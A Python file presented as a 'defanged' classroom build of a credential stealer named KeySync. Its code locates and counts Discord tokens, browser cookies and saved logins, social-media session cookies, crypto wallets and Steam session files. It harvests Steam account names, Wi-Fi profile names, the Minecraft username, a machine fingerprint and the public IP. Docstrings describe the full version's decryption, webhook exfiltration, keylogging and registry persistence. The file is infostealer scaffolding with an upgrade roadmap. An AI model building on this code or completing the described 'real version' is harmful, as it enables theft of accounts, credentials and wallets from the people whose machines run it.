"""
KEYSYNC v2 (SAFE / DEFANGED) — one-file info monitor (educational demo)

This is the classroom/build-portfolio version of KeySync. Per the security
guidelines, ALL of the following have been removed or simulated:
  - Credential extraction   -> routines only DETECT targets and log counts
  - Network exfiltration    -> nothing is ever transmitted; all "reports"
                               are printed to console + local log file
  - Decryption logic        -> no DPAPI/AES code; values are never opened
  - Silent persistence      -> no file copies, no registry writes

Grabs (detects, actually): Discord install + leveldb, browser cookie/login
DBs (counts only, no decryption), Gmail/Facebook/Instagram session presence,
Roblox local store, Steam loginusers.vdf account names, crypto wallet
folders (MetaMask / Exodus / Electrum — never read), Wi-Fi profile names
(no keys), Minecraft username, plus a simulated keylogger that counts
keystrokes without recording their contents.

Usage:
    python KeySync_safe.py            -> run the full simulated scan
    python KeySync_safe.py --keys     -> simulated keylogger (counts only)
    python KeySync_safe.py --test     -> simulate a webhook "send"
"""

import os
import sys
import json
import time
import re
import socket
import logging
import platform
import hashlib
import threading
import subprocess
import tempfile
import urllib.request

# ================= CONFIG =================
LOG_FILE = os.path.join(tempfile.gettempdir(), "keysync_safe.log")
KEY_BATCH_COUNT = 25          # how many keystrokes per simulated report
KEY_INTERVAL = 15            # seconds between simulated key reports
USER_AGENT = "KeySync-Safe/2.0 (educational)"
# ==========================================


# ================= MACHINE IDENTITY =================
def get_machine_id():
    """Short, stable, per-PC ID (8 hex chars) from the hostname.

    REAL VERSION: reads HKLM\\SOFTWARE\\Microsoft\\Cryptography\\MachineGuid.
    SAFE VERSION: hostname only — no registry access needed for a demo.
    """
    return hashlib.sha256(socket.gethostname().encode()).hexdigest()[:8].upper()


MACHINE_ID = get_machine_id()


def machine_tag():
    return f"[{MACHINE_ID}/{os.environ.get('USERNAME', '?')}]"


def machine_desc():
    return (f"PC: {socket.gethostname()} | "
            f"user: {os.environ.get('USERNAME', '?')} | "
            f"OS: {platform.system()} {platform.release()} "
            f"({platform.machine()})")


# ================= CORE HELPERS =================
def setup_logging():
    """Local file logging only — no network in this build."""
    logging.basicConfig(
        filename=LOG_FILE,
        level=logging.INFO,
        format="%(asctime)s [%(levelname)s] %(message)s",
    )


def sim_send(message):
    """SIMULATED exfiltration point.

    REAL VERSION: urllib POSTs a JSON/multipart payload to a Discord
    webhook, handling HTTP 429 rate limits with a retry.

    SAFE VERSION: print to console + local log. Nothing is transmitted.
    """
    line = f"{machine_tag()} [SIM-SEND] {message}"
    print(line)
    logging.info("[SIM-SEND] %s", message)


def sim_send_embed(title, description, color="info"):
    """SIMULATED embed message (what a rich webhook report would look like)."""
    print(f"\n┌─ {machine_tag()} {title} " + "─" * 20)
    print(f"│ {description}")
    print(f"└{'─' * 40}")
    logging.info("[SIM-EMBED] %s: %s", title, description)


def get_public_ip():
    """The only optional network call in this build, for demo flavor.

    REAL VERSION: also where tokens/cookies would be POSTed out.
    SAFE VERSION: this is the ONLY outbound request, and it sends nothing
    of the victim's own — it just asks a public API what the IP is.
    """
    try:
        req = urllib.request.Request("https://api.ipify.org?format=json",
                                     headers={"User-Agent": USER_AGENT})
        with urllib.request.urlopen(req, timeout=5) as r:
            return json.loads(r.read()).get("ip", "?")
    except Exception:
        return "(offline?)"


# ================= DISCORD TOKENS (SIMULATED) =================
def scan_discord():
    """Detect a Discord install + leveldb token storage.

    REAL VERSION: DPAPI-unprotects the os_crypt key from Local State,
    AES-GCM-decrypts every 'dQw4w9WgXcQ' blob in the leveldb, regex-
    validates the token format, then hits the Discord API to check if
    each token is alive.

    SAFE VERSION: we just check that the files EXIST and report how
    many token-shaped blobs we would have tried to decrypt. No blob is
    ever opened or decrypted.
    """
    found = 0
    appdata = os.environ.get("APPDATA", "")
    leveldb = os.path.join(appdata, "discord", "Local Storage", "leveldb")
    local_state = os.path.join(appdata, "discord", "Local State")

    if not os.path.isdir(leveldb):
        sim_send("💬 DISCORD: not installed (no leveldb folder found)")
        return
    for fn in os.listdir(leveldb):
        if fn.endswith((".log", ".ldb")):
            # count UNIQUE match MARKERS found, but capture nothing
            with open(os.path.join(leveldb, fn), "r",
                      encoding="utf-8", errors="ignore") as f:
                found += len(re.findall(r'dQw4w9WgXcQ', f.read()))

    has_key_file = os.path.exists(local_state)
    parts = [f"💬 DISCORD: installed"]
    parts.append(f"token-storage blobs detected: {found}")
    parts.append("key vault present: " +
                 ("yes (would DPAPI-decrypt)" if has_key_file else "no"))
    sim_send(" | ".join(parts))
    sim_send("     [SIM] a real build would decrypt + API-validate "
             "each token here")


# ================= BROWSER COOKIES + PASSWORDS (SIMULATED) =================
BROWSERS = {
    "chrome": os.path.join(os.environ.get("LOCALAPPDATA", ""),
                          "Google", "Chrome"),
    "edge":   os.path.join(os.environ.get("LOCALAPPDATA", ""),
                           "Microsoft", "Edge"),
    "brave":  os.path.join(os.environ.get("LOCALAPPDATA", ""),
                           "BraveSoftware", "Brave-Browser"),
    "opera":  os.path.join(os.environ.get("APPDATA", ""),
                           "Opera Software", "Opera Stable"),
}


def scan_browser(name, path):
    """Detect browser cookie/login DBs and count rows only.

    REAL VERSION: copies each SQLite DB to temp, DPAPI-unprotects the
    AES key from Local State, AES-GCM-decrypts each encrypted_value,
    and exfiltrates plaintext cookies + saved passwords.

    SAFE VERSION: we query ONLY the row COUNT from the SQLite DBs
    (SELECT COUNT(*)) — no encrypted values are ever selected,
    decrypted, or removed from the machine.
    """
    import sqlite3
    import shutil

    user_data = os.path.join(path, "User Data")
    if not os.path.isdir(user_data):
        return
    profiles = [p for p in os.listdir(user_data)
                if p.startswith(("Default", "Profile"))]

    for prof in profiles:
        profile = os.path.join(user_data, prof)
        for db, label in ((os.path.join(profile, "Network", "Cookies"),
                           "cookies"),
                          (os.path.join(profile, "Cookies"), "cookies"),
                          (os.path.join(profile, "Login Data"),
                           "saved logins")):
            if not os.path.exists(db):
                continue
            try:
                # copy so we never touch the live DB the browser uses
                tmp = os.path.join(tempfile.gettempdir(),
                                   os.urandom(4).hex() + ".db")
                shutil.copy2(db, tmp)
                conn = sqlite3.connect(tmp)
                cur = conn.cursor()
                if label == "cookies":
                    cur.execute("SELECT COUNT(*) FROM cookies")
                else:
                    cur.execute("SELECT COUNT(*) FROM logins")
                count = cur.fetchone()[0]
                conn.close()
                os.remove(tmp)
                sim_send(f"🌐 {name.upper()} [{prof}]: {count} {label} "
                         "in DB (values never decrypted) [SIM]")
            except Exception as e:
                logging.debug("browser scan %s: %s", name, e)


# ================= SITE SESSIONS (SIMULATED) =================
SITE_COOKIE_NAMES = {
    "Facebook":  (["c_user", "xs", "datr"],
                  os.path.join(os.environ.get("LOCALAPPDATA", ""),
                               "Roblox") and "%facebook.com"),  # host filter
    "Instagram": (["ds_user_id", "sessionid"],
                  "%instagram.com"),
    "Gmail":     (["SAPISID", "__Secure-3SID"],
                  "%google.com"),
}


def scan_site_sessions():
    """Check whether session cookies for FB/IG/Google EXIST (no decode).

    REAL VERSION: filters cookies by host + name, decrypts each value,
    writes a Netscape cookies.txt, and uploads it so the cookies can be
    replayed elsewhere for a live session.

    SAFE VERSION: we only count how many cookies MATCH each site's cookie
    NAMES. A plaintext VALUE never appears in memory or in the log.
    """
    import sqlite3
    import shutil

    for site, (want_names, host_like) in SITE_COOKIE_NAMES.items():
        hits = 0
        for bname, bpath in BROWSERS.items():
            user_data = os.path.join(bpath, "User Data")
            if not os.path.isdir(user_data):
                continue
            for prof in [p for p in os.listdir(user_data)
                         if p.startswith(("Default", "Profile"))]:
                for db in (os.path.join(user_data, prof,
                                        "Network", "Cookies"),
                           os.path.join(user_data, prof, "Cookies")):
                    if not os.path.exists(db):
                        continue
                    try:
                        tmp = os.path.join(tempfile.gettempdir(),
                                           os.urandom(4).hex() + ".db")
                        shutil.copy2(db, tmp)
                        conn = sqlite3.connect(tmp)
                        cur = conn.cursor()
                        # count only, and only the cookie NAMES —
                        # encrypted_value is never selected here
                        q = ("SELECT COUNT(*) FROM cookies "
                             "WHERE host_key LIKE ? AND name IN (%s)"
                             % ",".join("?" * len(want_names)))
                        cur.execute(q, [host_like] + want_names)
                        hits += cur.fetchone()[0]
                        conn.close()
                        os.remove(tmp)
                    except Exception:
                        pass
        if hits:
            sim_send(f"🍪 {site}: {hits} session cookie(s) present "
                     "(would be exported by a real build) [SIM]")
        else:
            sim_send(f"🍪 {site}: no session cookies found")


# ================= CRYPTO WALLETS (SIMULATED) =================
METAMASK_EXT_ID = "nkbihfbeogaeaoehlefnkodbefgpgknn"


def scan_crypto():
    """Detect wallet folders. Files are NEVER opened or copied.

    REAL VERSION: zips each wallet folder (vault.json, seed files,
    wallet.dat) and uploads it for offline cracking.

    SAFE VERSION: existence check + file count only.
    """
    appdata = os.environ.get("APPDATA", "")
    localappdata = os.environ.get("LOCALAPPDATA", "")

    # MetaMask (browser extension storage)
    mm_files = 0
    for bpath in BROWSERS.values():
        user_data = os.path.join(bpath, "User Data")
        if not os.path.isdir(user_data):
            continue
        for prof in os.listdir(user_data) \
                if os.path.isdir(user_data) else []:
            ext = os.path.join(user_data, prof,
                               "Local Extension Settings", METAMASK_EXT_ID)
            if os.path.isdir(ext):
                mm_files += len(os.listdir(ext))
    if mm_files:
        sim_send(f"🦊 METAMASK: extension storage detected "
                 f"({mm_files} files — none were read) [SIM]")

    # Exodus
    exodus = os.path.join(appdata, "Exodus", "exodus.wallet")
    if os.path.isdir(exodus):
        sim_send(f"💰 EXODUS: wallet folder present "
                 f"({len(os.listdir(exodus))} files — seed not read) [SIM]")

    # Electrum
    wallets = os.path.join(appdata, "Electrum", "wallets")
    if os.path.isdir(wallets):
        files = [f for f in os.listdir(wallets)
                 if os.path.isfile(os.path.join(wallets, f))]
        sim_send(f"⚡ ELECTRUM: {len(files)} wallet file(s) present "
                 "(not opened) [SIM]")


# ================= ROBLOX (SIMULATED) =================
def scan_roblox():
    """Check for the Roblox local store. The cookie is never printed.

    REAL VERSION: extracts the full .ROBLOSECURITY session cookie and
    uploads it (cookie = instant account takeover).

    SAFE VERSION: does the store exist? Yes/No.
    """
    path = os.path.join(os.environ.get("LOCALAPPDATA", ""),
                        "Roblox", "LocalStorage", "store.json")
    if os.path.exists(path):
        sim_send("🎮 ROBLOX: local store found (session cookie NOT "
                 "extracted) [SIM]")
    else:
        sim_send("🎮 ROBLOX: no local store")


# ================= STEAM (account names only) =================
def _steam_path():
    candidates = [
        os.path.join(os.environ.get("ProgramFiles(x86)",
                                    r"C:\Program Files (x86)"), "Steam"),
        r"C:\Program Files\Steam",
    ]
    for c in candidates:
        if c and os.path.isdir(c):
            return c
    return None


def scan_steam():
    """Parse loginusers.vdf for account NAMES only.

    SAFE VERSION: loginusers.vdf holds no secrets (just SteamID + display
    names), so reading it is harmless. The ssfn session files — which DO
    allow session hijacking — are counted, never copied.

    REAL VERSION: also zips + uploads ssfn* files.
    """
    steam = _steam_path()
    if not steam:
        sim_send("🎮 STEAM: not found")
        return
    vdf = os.path.join(steam, "config", "loginusers.vdf")
    names = []
    if os.path.exists(vdf):
        with open(vdf, "r", encoding="utf-8", errors="ignore") as f:
            for m in re.finditer(r'"AccountName"\s+"([^"]*)"', f.read()):
                if m.group(1) not in names:
                    names.append(m.group(1))
    ssfn = [f for f in os.listdir(steam) if f.startswith("ssfn")]
    sim_send(f"🎮 STEAM accounts: {', '.join(names) or '(none saved)'}")
    sim_send(f"     ssfn session files present: {len(ssfn)} "
             "(not copied) [SIM]")


# ================= WI-FI (names only — no keys) =================
def scan_wifi():
    """List saved Wi-Fi profile NAMES only.

    REAL VERSION: runs 'netsh wlan show profile key=clear' and regexes
    the 'Key Content' plaintext password for each profile.

    SAFE VERSION: key=clear is NEVER used — no password is ever read.
    """
    if platform.system() != "Windows":
        sim_send("📶 WIFI: netsh is Windows-only, skipped")
        return
    try:
        result = subprocess.run(
            ["netsh", "wlan", "show", "profiles"],
            capture_output=True, text=True, timeout=15,
            creationflags=subprocess.CREATE_NO_WINDOW)
        profiles = re.findall(r"All User Profile\s*:\s(.*)",
                              result.stdout)
        sim_send(f"📶 WIFI: {len(profiles)} saved profile(s): "
                 + ", ".join(p.strip() for p in profiles[:5])
                 + (" ..." if len(profiles) > 5 else "")
                 + " (passwords not queried) [SIM]")
    except Exception as e:
        logging.debug("wifi scan: %s", e)


# ================= MINECRAFT (harmless, kept real) =================
MC_DIR = os.path.join(os.environ.get("APPDATA", ""), ".minecraft")


def get_mc_username():
    """Player name only — a public username, not a credential."""
    try:
        log = os.path.join(MC_DIR, "logs", "latest.log")
        if os.path.exists(log):
            with open(log, "r", encoding="utf-8", errors="ignore") as f:
                lines = f.readlines()
            for line in reversed(lines[-200:]):
                m = re.search(r"Setting user: (\w{2,16})", line)
                if m:
                    return m.group(1)
        lacc = os.path.join(MC_DIR, "launcher_accounts.json")
        if os.path.exists(lacc):
            with open(lacc, "r", encoding="utf-8",
                      errors="ignore") as f:
                data = json.load(f)
            for acct in data.get("accounts", {}).values():
                name = (acct.get("minecraftProfile", {}).get("name")
                        or acct.get("username"))
                if name:
                    return name
    except Exception as e:
        logging.debug("mc scan: %s", e)
    return None


# ================= KEYLOGGER (SIMULATED, counts only) =================
class SimKeyLogger:
    """Simulated keylogger.

    REAL VERSION: pynput captures every key CHAR; batches of chars are
    POSTed to the webhook. Captured text may include typed passwords.

    SAFE VERSION: this simulated version just periodically reports that
    N keystrokes WOULD have been captured — it counts fake events on a
    timer and never records what was actually typed.

    (If you want a live demo without pynput: a real build uses
    `from pynput import keyboard` here.)
    """

    def __init__(self):
        self._stop = threading.Event()
        self.count = 0

    def _loop(self):
        batch = 0
        while not self._stop.wait(KEY_INTERVAL):
            batch += 3  # pretend a few keys were typed
            self.count += batch
            if batch >= 5:
                sim_send(f"⌨️  [SIM] keylogger: ~{batch} keystrokes this "
                         "interval (contents not recorded)")
                batch = 0
            if self.count >= KEY_BATCH_COUNT * 4:
                self._stop.set()

    def start(self):
        t = threading.Thread(target=self._loop, daemon=True)
        t.start()
        t.join()          # run for demo duration, then return
        sim_send(f"⌨️  [SIM] keylogger stopped after ~{self.count} "
                 "total keystrokes")

    def stop(self):
        self._stop.set()


# ================= PERSISTENCE (simulated — nothing written) =================
def install_persistence():
    """Simulated persistence install.

    REAL VERSION: copies itself to %APPDATA%\\KeySync, hides the file
    via SetFileAttributesW, and writes a HKCU ...\\Run registry value
    so it relaunches at every login.

    SAFE VERSION: log what WOULD have happened. No file copy,
    no hide, no registry write.
    """
    dst = os.path.join(os.environ.get("APPDATA", ""), "KeySync")
    sim_send(f"[SIM] PERSISTENCE: real build would copy itself to "
             f"{dst} and add a HKCU Run key")
    sim_send("     safe build writes NOTHING to disk or registry")


# ================= FULL SCAN =================
def run_full_scan():
    """One-shot simulated scan — every section is detection-only."""
    sim_send_embed("KeySync SAFE — Scan Starting", machine_desc())

    scan_discord()
    for name, path in BROWSERS.items():
        scan_browser(name, path)
    scan_site_sessions()
    scan_crypto()
    scan_roblox()
    scan_steam()
    scan_wifi()

    mc = get_mc_username()
    if mc:
        sim_send(f"⛏  MINECRAFT username: {mc}")

    sim_send_embed("Scan Complete",
                   f"IP: {get_public_ip()} (only outbound request in "
                   "this build)\n"
                   "No credentials were read, decrypted, or transmitted.")


# ================= MAIN =================
def main():
    setup_logging()
    args = sys.argv[1:]

    if "--test" in args:
        sim_send("✅ [SIM] webhook test — real build would POST a JSON "
                 "payload to a Discord webhook here")
        print("Simulated webhook send OK (nothing was transmitted).")
        sys.exit(0)

    if "--install" in args:
        install_persistence()
        sys.exit(0)

    if "--keys" in args:
        SimKeyLogger().start()
        sys.exit(0)

    run_full_scan()


if __name__ == "__main__":
    try:
        main()
    except Exception:
        logging.error("Fatal:\n", exc_info=True)
        print("Something went wrong — check the log:", LOG_FILE)